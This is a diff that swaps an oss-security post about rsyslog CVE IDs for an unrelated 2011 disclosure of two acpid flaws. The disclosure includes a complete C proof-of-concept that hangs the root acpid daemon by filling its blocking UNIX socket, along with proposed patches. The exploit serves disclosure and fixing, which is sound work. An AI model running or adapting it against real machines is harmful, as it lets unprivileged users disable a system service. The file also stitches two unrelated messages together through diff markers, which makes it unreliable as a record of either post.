@@ -1,38 +1,155 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/04/04/41
-Message-ID: <597164508.370300.1301941390217.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Mon, 4 Apr 2011 14:23:10 -0400 (EDT)
-From: Josh Bressers <bressers@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/01/19/4
+Message-ID: <20110119120307.GA7449@albatros>
+Date: Wed, 19 Jan 2011 15:03:07 +0300
+From: Vasiliy Kulikov <segoon@...nwall.com>
 To: oss-security@...ts.openwall.com
-Cc: coley <coley@...re.org>
-Subject: Re: CVE Request: rsyslogd memory leaks
+Subject: 2 acpid flaws
 Content-Type: text/plain; charset=utf-8
 
-It would seem this needs three IDs (due to version differences).
+I. Blocking write.
 
-> 
-> The $RepeatedMsgReduction option could cause a memory leak:
-> http://bugzilla.adiscon.com/show_bug.cgi?id=225
-> http://git.adiscon.com/?p=rsyslog.git;a=commitdiff;h=8083bd1433449fd2b1b79bf759f782e0f64c0cd2
+I.1. Description.
 
-The above is fixed in versions 5.6.4 ad 5.7.6
-CVE-2011-1488
+acpid informs unprivileged processes about acpi events via UNIX socket.
+This socket is in blocking mode.  If unprivileged process stops reading
+data from the socket then, in some time, the socket queue fills up
+leading to hanging privileged acpid daemon.  The daemon hangs until the
+socket peer process reads some portion of the queued data or the peer
+process exits/is killed.
 
-> 
-> Multiple rulesets that are used by multiple inputs could cause a
-> memory leak or crash:
-> http://bugzilla.adiscon.com/show_bug.cgi?id=226
+On Linux 2.6.35 the queue fills up after 208 acpi events.  On the
+testing laptop one "BATTERY" event is emitted every 2-3 minutes, it is
+equivalent of 6-10 hours before triggering the hanging.
 
-The above bug claims it's fixed in versions 5.6.3 and 5.7.6
-CVE-2011-1489
+I.2. Exploit.
 
-> http://bugzilla.adiscon.com/show_bug.cgi?id=218
-> http://git.adiscon.com/?p=rsyslog.git;a=commitdiff;h=1ef709cc97d54f74d3fdeb83788cc4b01f4c6a2a
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <errno.h>
+#include <sys/un.h>
+#include <fcntl.h>
+#include <unistd.h>
 
-The above bug is fixed in versions 5.6.4, 5.7.6, and 6.1.5
-CVE-2011-1490
+/* Tested on acpid-1.0.10 (Ubuntu 10.04) */
 
-Thanks.
+int ud_connect(const char *name)
+{
+	int fd;
+	int r;
+	struct sockaddr_un addr;
+
+	fd = socket(AF_UNIX, SOCK_STREAM, 0);
+	if (fd < 0) {
+		perror("socket");
+		return fd;
+	}
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sun_family = AF_UNIX;
+	sprintf(addr.sun_path, "%s", name);
+
+	r = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
+	if (r < 0) {
+		perror("connect");
+		close(fd);
+		return r;
+	}
+
+	return fd;
+}
+
+int main(int argc, char *argv[])
+{
+	int fd;
+	char c;
+
+	if (argc != 2) {
+		fprintf(stderr, "Usage: prog fname\n");
+		exit(1);
+	}
+
+	fd = ud_connect(argv[1]);
+	if (fd < 0)
+		exit(1);
+	printf("\"Hanging\" socket opened, fd = %d\n", fd);
+
+	fd = ud_connect(argv[1]);
+	if (fd < 0)
+		exit(1);
+	printf("Normal socket opened, fd = %d\n", fd);
+
+	while (1) {
+		static int n;
+		read(fd, &c, 1);
+		fflush(stdout);
+		if (c == '\n') {
+			printf("%d messages in queue\n", ++n);
+		}
+	}
+}
+
+
+I.3. Possible patch.
+
+--- a/acpid.c
++++ b/acpid.c
+@@ -307,6 +307,7 @@
+                                non_root_clients++;
+                        }
+                        fcntl(cli_fd, F_SETFD, FD_CLOEXEC);
++                       fcntl(cli_fd, F_SETFL, O_NONBLOCK);
+                        snprintf(buf, sizeof(buf)-1, "%d[%d:%d]",
+                                creds.pid, creds.uid, creds.gid);
+                        acpid_add_client(cli_fd, buf);
+--
+
+
+II. Incorrect accept(2) error handling.
+
+II.1. Description.
+
+acpid doesn't gracefully handle client disconnection before the call to
+accept(2).  If client calls close(2) between acpid calls poll(2) and
+accept(2), acpid would hang in accept(2) until new client connects to
+/var/run/acpid.socket.
+
+This is only theoretical flaw as with current Linux kernel
+implementation accept(2) would return new socket handler even if the
+peer is closed.  However this behavior is implementation specific and
+may be changed in future versions of kernels (or custom versions).
+
+II.2. Exploit.
+
+None known.
+
+II.3. Possible patch.
+
+--- a/acpid.c
++++ b/acpid.c
+@@ -136,6 +136,7 @@
+                        exit(EXIT_FAILURE);
+                }
+                fcntl(sock_fd, F_SETFD, FD_CLOEXEC);
++               fcntl(sock_fd, F_SETFL, O_NONBLOCK);
+                chmod(socketfile, socketmode);
+                if (socketgroup) {
+                        struct group *gr;
+--
+
+
+P.S. Ideally fcntl()s' return codes should be cheched, but in this case
+all other fcntl/chmod/getsockopt/etc. calls should be checked too.  Such
+a massive rework is probably not related to the subject.
+
+
+[1] http://acpid.sourceforge.net/
+
+
+Thanks,
 
 -- 
-    JB
+Vasiliy
